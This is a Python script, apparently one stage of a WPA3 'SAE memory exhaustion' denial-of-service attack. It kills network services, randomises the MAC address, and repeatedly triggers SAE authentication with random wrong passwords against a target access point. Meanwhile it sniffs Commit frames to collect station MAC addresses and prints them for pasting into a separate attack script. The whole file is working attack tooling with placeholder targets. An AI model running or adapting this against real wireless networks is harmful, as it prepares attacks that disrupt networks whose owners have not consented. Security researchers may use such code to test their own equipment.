#!/usr/bin/env python3
"""
=============================================================================
Known MAC Address Capture for SAE Memory Exhaustion Attack
=============================================================================
This script captures the source MAC addresses of SAE Commit frames that are
sent to a target WPA3 Access Point. It triggers SAE connection attempts with
incorrect passwords (via wpa_supplicant) and sniffs the resulting Commit
frames on a monitor interface.
=============================================================================
"""

import os
import sys
import time
import random
import string
import subprocess
from scapy.all import AsyncSniffer, Dot11Auth, Dot11

# ========================= CONFIGURATION =========================
MONITOR_IFACE = "wlanXmon" 
MANAGED_IFACE = "wlanX" 
TARGET_BSSID = "AA:BB:CC:DD:EE:11".lower()
TARGET_CHANNEL = "X"    # Channel of the target network
TARGET_SSID = "Your_WiFi_Name" 
NUM_MACS = 20 
# =================================================================

def get_freq(channel: str) -> int:
    ch = int(channel)
    if ch == 14: return 2484
    if ch <= 13: return 2407 + (ch * 5)
    return 5000 + (ch * 5)

def clean_wpa_state(iface):
    os.system("rfkill unblock all") 
    time.sleep(0.5)
    os.system("killall wpa_supplicant 2>/dev/null")
    os.system("killall NetworkManager 2>/dev/null")
    os.system(f"rm -rf /var/run/wpa_supplicant/{iface} 2>/dev/null")
    os.system(f"ifconfig {iface} down 2>/dev/null && ifconfig {iface} up 2>/dev/null")
    os.system(f"ifconfig {iface} down 2>/dev/null")
    os.system(f"macchanger -r {iface} >/dev/null 2>&1")
    os.system(f"ifconfig {iface} up 2>/dev/null")
    
    time.sleep(1)

def main():
    if os.geteuid() != 0:
        sys.exit("This script must be run as root (sudo).")

    freq = get_freq(TARGET_CHANNEL)
    
    print("[*] Unblocking RF-kill (Flight mode)...")
    os.system("rfkill unblock all")
    time.sleep(1)

    # 1. Bring interfaces UP and set the channel properly
    print(f"[*] Bringing {MONITOR_IFACE} UP and setting to channel {TARGET_CHANNEL}...")
    os.system(f"ifconfig {MONITOR_IFACE} down 2>/dev/null")
    os.system(f"iwconfig {MONITOR_IFACE} mode monitor 2>/dev/null")
    os.system(f"ifconfig {MONITOR_IFACE} up 2>/dev/null")
    time.sleep(0.5)
    os.system(f"iwconfig {MONITOR_IFACE} channel {TARGET_CHANNEL} 2>/dev/null")
    
    print(f"[*] Freeing {MANAGED_IFACE} from locks...")
    clean_wpa_state(MANAGED_IFACE)

    captured_macs = set()

    def stop_sniffing(pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 0 and pkt.subtype == 11:
                addr1 = pkt.addr1.lower() if pkt.addr1 else ""
                addr2 = pkt.addr2.lower() if pkt.addr2 else ""
                
                # Check if frame is sent TO the AP
                if addr1 == TARGET_BSSID and addr2 not in captured_macs:
                    captured_macs.add(addr2)
                    print(f"[+] New Commit from {addr2} (Total: {len(captured_macs)}/{NUM_MACS})")

    print(f"[*] Starting capture on channel {TARGET_CHANNEL} (freq {freq} MHz)")
    print(f"[*] Target BSSID: {TARGET_BSSID}")

    attempt = 0
    while len(captured_macs) < NUM_MACS:
        attempt += 1
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

        conf = f"""ctrl_interface=/var/run/wpa_supplicant
sae_groups=19

network={{
    ssid="{TARGET_SSID}"
    scan_ssid=1
    bssid={TARGET_BSSID}
    sae_password="{password}"
    key_mgmt=SAE
    proto=RSN
    ieee80211w=2
}}"""
        with open("/tmp/temp_known_macs.conf", "w") as f:
            f.write(conf)

        print(f"[*] Attempt {attempt}: connecting with fake password: '{password}'")
        
        # Start AsyncSniffer
        sniffer = AsyncSniffer(
            iface=MONITOR_IFACE,
            prn=stop_sniffing,
            stop_filter=lambda x: len(captured_macs) >= NUM_MACS,
            timeout=5
        )
        sniffer.start()
        time.sleep(0.5)

        wpa = subprocess.Popen(
            ["wpa_supplicant", "-i", MANAGED_IFACE, "-c", "/tmp/temp_known_macs.conf"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        sniffer.join()

        wpa.terminate()
        try: wpa.wait(timeout=2)
        except: wpa.kill()
        clean_wpa_state(MANAGED_IFACE)

    print("\n" + "="*60)
    print(f"Capture finished. Collected {len(captured_macs)} unique MAC addresses.")
    print("Copy the following lines into the attack script:")
    
    band_suffix = "5GHZ" if int(TARGET_CHANNEL) >= 36 else "2_4GHZ"
    print(f"\nKNOWN_STA_MACS_{band_suffix} = [")
    for mac in sorted(captured_macs):
        print(f'    "{mac}",')
    print("]")

    if os.path.exists("/tmp/temp_known_macs.conf"):
        os.remove("/tmp/temp_known_macs.conf")
    os.system("systemctl restart NetworkManager 2>/dev/null")

if __name__ == "__main__":
    main()
